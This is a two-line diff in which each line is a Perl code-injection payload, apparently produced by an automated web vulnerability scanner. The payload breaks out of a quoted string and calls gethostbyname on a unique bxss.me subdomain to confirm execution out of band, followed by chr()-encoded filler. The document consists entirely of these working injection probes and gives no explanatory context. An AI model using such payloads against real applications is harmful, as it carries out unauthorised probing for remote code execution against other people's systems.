@@ -1,1 +1,1 @@
-'.gethostbyname(lc('hitdo'.'ytnupmll73129.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(78).chr(122).chr(89).'
+".gethostbyname(lc("hitwz"."ezuvhnhn7cc02.bxss.me."))."A".chr(67).chr(hex("58")).chr(112).chr(79).chr(99).chr(73)."
